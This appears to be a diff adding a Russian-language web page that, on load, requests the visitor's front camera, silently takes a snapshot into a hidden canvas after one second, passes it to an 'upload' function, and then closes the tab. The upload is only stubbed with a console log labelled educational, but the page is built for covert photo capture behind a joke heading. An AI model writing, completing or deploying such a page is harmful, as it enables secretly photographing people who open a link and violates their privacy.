@@ -1,0 +1,105 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Автоматический снимок с камеры</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #f0f0f0;
+            margin: 0;
+            padding: 0;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+        }
+
+        .container {
+            text-align: center;
+            background-color: #fff;
+            border-radius: 10px;
+            box-shadow: 0 4px 10px rgba(0, 0, 0, 0.1);
+            padding: 20px;
+            width: 300px;
+        }
+
+        h1 {
+            color: #333;
+            font-size: 24px;
+            margin-bottom: 20px;
+        }
+
+        canvas {
+            display: none;
+        }
+    </style>
+</head>
+<body>
+
+<div class="container">
+    <h1>zal upa</h1>  <!-- Текст на странице -->
+</div>
+
+<script>
+    // Проверка на поддержку getUserMedia
+    if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
+        // Получение доступа к камере устройства
+        const canvas = document.createElement("canvas");
+
+        // Запрашиваем доступ к камере
+        async function setupCamera() {
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
+
+                // Создаем элемент видео для захвата потока с камеры
+                const video = document.createElement("video");
+                video.srcObject = stream;
+
+                // Делаем снимок сразу после того, как видео начнется
+                video.onloadedmetadata = () => {
+                    video.play();
+                    // Делаем снимок через 1 секунду
+                    setTimeout(() => {
+                        takeSnapshot(video);
+                    }, 1000); // Задержка для начала работы камеры
+                };
+            } catch (err) {
+                alert("Не удалось получить доступ к камере: " + err.message);
+            }
+        }
+
+        // Функция для снятия фото
+        function takeSnapshot(video) {
+            const context = canvas.getContext("2d");
+            // Устанавливаем размер канваса в размеры видео
+            canvas.width = video.videoWidth;
+            canvas.height = video.videoHeight;
+            // Рисуем текущее изображение с видео в канвасе
+            context.drawImage(video, 0, 0, canvas.width, canvas.height);
+            // Получаем изображение в виде Data URL
+            const dataURL = canvas.toDataURL("image/png");
+
+            // Отправляем снимок на сервер
+            uploadPhoto(dataURL);
+        }
+
+
+        // Функция для отправки фото на сервер через POST
+        function uploadPhoto(imageData) {
+            console.log('Фото отправлено:', imageData); // Для образовательных целей выводим изображение в консоль
+            // После отправки снимка, автоматически закрываем вкладку
+            window.close();  // Закрываем вкладку
+        }
+
+        // Инициализируем камеру при загрузке страницы
+        window.onload = setupCamera;
+
+    } else {
+        alert("Ваш браузер не поддерживает доступ к камере.");
+    }
+</script>
+
+</body>
+</html>
